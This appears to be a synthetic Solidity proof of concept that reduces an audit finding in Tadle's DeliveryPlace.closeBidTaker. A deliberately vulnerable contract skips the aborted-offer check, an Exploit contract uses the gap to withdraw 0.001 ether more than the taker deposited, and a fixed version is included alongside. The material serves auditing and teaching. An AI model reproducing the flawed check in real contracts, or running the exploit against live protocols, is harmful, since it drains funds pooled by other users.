// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Tadle DeliveryPlace.closeBidTaker — an aborted ask is Settled, and the
    only status check is offerStatus != Settled (CodeHawks / eeyore, finding 38089).

    SYNTHETIC, cheatcode-free reduction of the quoted PoC. Ask amount is
    0.01 ether, 1000 points, collateral rate 12000, taker buys 500 points.
    abortAskOffer refunds the maker 0.007 ether and marks the offer Settled.
    closeBidTaker then credits the taker 0.006 ether. Their deposit was
    0.005 ether. The extra 0.001 ether comes out of the shared pool.

    The quoted lines are preserved. run() does not warp. */

contract USDC {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PreMarkets {
    enum OfferStatus { Virgin, Canceled, Settled }
    enum AbortOfferStatus { Initialized, Aborted }
    enum OfferType { Ask, Bid }

    uint256 public constant AMOUNT = 0.01 ether;
    uint256 public constant POINTS = 1000;
    uint256 public constant USED = 500;
    uint256 public constant RATE = 12000;
    uint256 public constant SCALER = 10000;

    OfferStatus public offerStatus;
    AbortOfferStatus public abortOfferStatus;
    uint256 public settledPoints;
    uint256 public makerRefund;
    address public maker;
    address public token;

    function seed(address maker_, address token_) external {
        maker = maker_;
        token = token_;
        offerStatus = OfferStatus.Virgin;
        abortOfferStatus = AbortOfferStatus.Initialized;
    }

    function abortAskOffer() external {
        require(msg.sender == maker, "maker");
        uint256 transferAmount = AMOUNT * RATE / SCALER;
        uint256 totalUsedAmount = AMOUNT * USED / POINTS;
        uint256 totalDepositAmount = totalUsedAmount;
        if (transferAmount > totalDepositAmount) {
            makerRefund = transferAmount - totalDepositAmount;
        }
        abortOfferStatus = AbortOfferStatus.Aborted;
        offerStatus = OfferStatus.Settled;
    }
}

contract DeliveryPlace {
    USDC public usdc;
    PreMarkets public pre;
    address public other;
    uint256 public pool;
    uint256 public attackerCredit;
    uint256 public otherCredit;
    uint256 public userCollateralFee;
    bool public closed;

    constructor(USDC usdc_, PreMarkets pre_, address other_) {
        usdc = usdc_;
        pre = pre_;
        other = other_;
    }

    function fund(uint256 amount, uint256 otherAmount) external {
        pool += amount;
        otherCredit += otherAmount;
    }

    function closeBidTaker() external {
        require(!closed, "closed");
        uint256 userRemainingPoints = PreMarkets(address(pre)).USED();
        PreMarkets.OfferStatus status = pre.offerStatus();
        // @> VULN: aborted offers are Settled, and abortOfferStatus is never checked
        if (status != PreMarkets.OfferStatus.Settled) {
            revert("InvalidOfferStatus");
        }
        uint256 usedAmount = pre.AMOUNT() * pre.USED() / pre.POINTS();
        uint256 collateralFee = usedAmount * pre.RATE() / pre.SCALER();
        userCollateralFee = collateralFee * userRemainingPoints / pre.USED();
        attackerCredit = userCollateralFee;
        closed = true;
    }

    function withdrawMaker() external {
        uint256 amount = pre.makerRefund();
        pool -= amount;
        usdc.transfer(pre.maker(), amount);
    }

    function withdrawAttacker(address to) external {
        uint256 amount = attackerCredit;
        attackerCredit = 0;
        pool -= amount;
        usdc.transfer(to, amount);
    }

    function withdrawOther() external {
        uint256 amount = otherCredit;
        otherCredit = 0;
        pool -= amount;
        usdc.transfer(other, amount);
    }
}

contract DeliveryPlaceFixed {
    USDC public usdc;
    PreMarkets public pre;
    uint256 public pool;
    uint256 public attackerCredit;

    constructor(USDC usdc_, PreMarkets pre_) {
        usdc = usdc_;
        pre = pre_;
    }

    function fund(uint256 amount) external {
        pool += amount;
    }

    function closeBidTaker() external {
        if (pre.abortOfferStatus() == PreMarkets.AbortOfferStatus.Aborted) {
            revert("Pre offer aborted");
        }
        if (pre.offerStatus() != PreMarkets.OfferStatus.Settled) {
            revert("InvalidOfferStatus");
        }
    }

    function payDeposit(address to) external {
        uint256 deposit = pre.AMOUNT() * pre.USED() / pre.POINTS();
        attackerCredit = deposit;
        pool -= deposit;
        usdc.transfer(to, deposit);
    }
}

contract Maker {
    PreMarkets public pre;

    constructor(PreMarkets pre_) {
        pre = pre_;
    }

    function abort() external {
        pre.abortAskOffer();
    }
}

contract Exploit {
    uint256 public constant TAKER_IN = 0.005 ether;
    uint256 public constant CREDITED = 0.006 ether;
    uint256 public constant STOLEN = 0.001 ether;
    uint256 public constant OTHER_IN = 1 ether;
    uint256 public constant MAKER_IN = 0.012 ether;
    uint256 public constant MAKER_REFUND = 0.007 ether;

    USDC public usdc;
    PreMarkets public pre;
    DeliveryPlace public delivery;
    Maker public maker;
    address public other;
    uint256 public received;
    uint256 public poolLeft;

    constructor() {
        usdc = new USDC();
        pre = new PreMarkets();
        maker = new Maker(pre);
        other = address(0x0B0E);
        pre.seed(address(maker), address(usdc));
        delivery = new DeliveryPlace(usdc, pre, other);
        usdc.mint(address(delivery), OTHER_IN + MAKER_IN + TAKER_IN);
        delivery.fund(OTHER_IN + MAKER_IN + TAKER_IN, OTHER_IN);
    }

    function run() external {
        maker.abort();
        delivery.closeBidTaker();
        delivery.withdrawMaker();
        delivery.withdrawAttacker(address(this));
        received = usdc.balanceOf(address(this));
        poolLeft = delivery.pool();
        require(pre.offerStatus() == PreMarkets.OfferStatus.Settled, "settled");
        require(pre.abortOfferStatus() == PreMarkets.AbortOfferStatus.Aborted, "aborted");
        require(delivery.userCollateralFee() == CREDITED, "fee");
        require(received == CREDITED, "received");
        require(received - TAKER_IN == STOLEN, "stolen");
        require(poolLeft == OTHER_IN + 0.004 ether, "pool");
        require((OTHER_IN + 0.005 ether) - poolLeft == STOLEN, "short");
    }
}
